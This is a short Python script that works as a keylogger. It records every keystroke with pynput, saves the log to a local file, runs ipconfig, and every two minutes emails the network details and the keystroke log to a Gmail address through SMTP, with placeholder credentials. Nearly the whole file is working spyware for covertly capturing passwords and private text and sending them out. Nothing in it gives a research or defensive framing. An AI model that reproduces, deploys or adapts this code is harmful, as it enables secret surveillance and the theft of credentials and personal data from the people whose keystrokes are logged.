import smtplib
import subprocess

import pynput.keyboard
import requests
from pynput.keyboard import Key
import threading

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


log = ""
wrt = ""


def send_mail(email, passwd, message):
    server=smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email,passwd)
    server.sendmail(email,email,message)
    print("message send")
    server.quit()


def process_key_press(key):
    file = open("geeks.text", "w")
    global log
    try:
        log = log + str(key.char)

    except AttributeError:
        if key == Key.space:
            log = log + " "
        else:
            log = log + " " + key.char + " "
    finally:
        file.write(log+"\n")
        file.close()




def report():
    global log
    #send_mail("example@gmail.com","password",log)
    send_attachement()
    log=""
    timer = threading.Timer(120,report)
    timer.start()



def check_connection():
    url = "http://www.google.com"
    timeout = 15
    try:
        requests.get(url, timeout=timeout)
        return True
    except:
        return False






def send_attachement():

    fromaddr = "example@gmail.com"
    toaddr = "example@gmail.com"
    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "The Daily Note"

    body = "Check the Attachment"

    msg.attach(MIMEText(body, 'plain'))

    filename = "geeks.text"
    attachment = open("geeks.text", "rb")

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, "passwd")
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    print("Mail sent......")
    s.quit()




keyboard_listener = pynput.keyboard.Listener(on_press = process_key_press)

with keyboard_listener:
    conn = check_connection()

    while conn == False:
        conn = check_connection()

    command = "ipconfig"
    result = subprocess.check_output(command, shell=True)
    send_mail("example@gmail.com", "password", ("Keylogger Started\n"+str(result)))
    report()
    keyboard_listener.join()

